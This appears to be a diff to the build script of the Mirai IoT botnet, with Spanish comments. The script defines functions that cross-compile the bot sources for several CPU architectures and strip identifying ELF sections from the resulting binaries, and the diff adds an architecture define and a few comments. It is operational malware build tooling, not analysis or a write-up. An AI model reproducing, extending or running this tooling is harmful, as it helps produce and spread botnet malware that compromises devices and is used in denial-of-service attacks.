@@ -17,17 +17,18 @@ export PATH=$PATH:/etc/xcompile/x86_64/bin
 
 # Función de compilación estándar
 
+# Función de compilación estándar
 function compile_bot {
     SOURCES=$(find bot -name '*.c')
-    "$1-gcc" -std=c99 -I. -Ibot/headers $3 $SOURCES -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
+    "$1-gcc" -std=c99 -I. -Ibot/headers -DBOT_ARCH=\"$1\" $3 $SOURCES -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
     "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
 }
 
+# Función especial para armv7l (sin strip adicional)
 function compile_bot_arm7 {
     SOURCES=$(find bot -name '*.c')
-    "$1-gcc" -std=c99 -I. -Ibot/headers $3 $SOURCES -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
+    "$1-gcc" -std=c99 -I. -Ibot/headers -DBOT_ARCH=\"$1\" $3 $SOURCES -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
 }
-
 
 # Crear directorio de salida
 mkdir -p release
